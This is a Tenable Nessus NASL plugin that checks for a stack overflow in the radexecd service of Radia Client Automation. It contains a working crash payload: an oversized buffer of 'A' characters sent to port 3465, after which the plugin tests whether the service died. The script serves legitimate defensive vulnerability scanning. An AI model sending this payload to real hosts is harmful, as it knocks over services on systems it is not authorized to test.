#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(86251);
  script_version("1.7");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_name(english:"Persistent Systems Radia Client Automation Agent Stack Overflow Remote Code Execution (destructive check)");

  script_set_attribute(attribute:"synopsis", value:
"The Persistent Systems Radia Client Automation agent listening on the
remote port is affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Persistent Systems Radia Client Automation (formerly HP Client
Automation) agent listening on the remote port is affected by a remote
code execution vulnerability due to a stack overflow condition in the
radexecd service. An unauthenticated, remote attacker can exploit this
to execute arbitrary code with SYSTEM privileges.");
  # https://support.accelerite.com/hc/en-us/articles/205300910-Response-to-recently-published-reports-by-Zero-Day-Initiative
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ce7789b9");
  script_set_attribute(attribute:"see_also", value:"https://www.zerodayinitiative.com/advisories/ZDI-15-363/");
  script_set_attribute(attribute:"solution", value:
"See the vendor advisory for a possible solution.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/07/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/10/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:persistent_systems:radia_client_automation");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:client_automation_enterprise");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2015-2022 Tenable Network Security, Inc.");

  script_dependencies("ovcm_notify_daemon_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("Services/radexecd");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");

# Only radexecd on Windows seems to be affected 
os = get_kb_item_or_exit("Host/OS");
if("windows" >!< tolower(os))
  audit(AUDIT_OS_NOT, "Windows");

# The port for the Notify daemon (radexecd)
port = get_service(svc:'radexecd', default:3465, exit_on_fail:TRUE);

# Attack only if the detection plugin determines noauth is enabled 
# for radexecd 
if (get_kb_item("radexecd/" + port + "/noauth") != TRUE)
  exit(0, "User authentication for radexecd on port " + port + " seems to be enabled, skipping the attack.");

s = open_sock_tcp(port);
if(!s) audit(AUDIT_SOCK_FAIL, port);

req = '\x00' +                          # return port; insignificant
      'U_' + SCRIPT_NAME + '\x00' +     # max: 0x20 bytes
      'P_' + SCRIPT_NAME + '\x00' +     # max: 0x20 bytes
      crap(data:'A', length:0x280) + '.tlc' + '\x00'; # overflow a 0x105-byte stack buffer 

send(socket: s, data: req);
sleep(5);
close(s);

# Check if service crashes
r = service_is_dead(port:port);
if(r == 1)
  security_hole(port: port);
else if (r == 0)
  audit(AUDIT_LISTEN_NOT_VULN, "radexecd", port);
else
  exit(1, "An IPS may be in the way to remote port " + port + ".");
   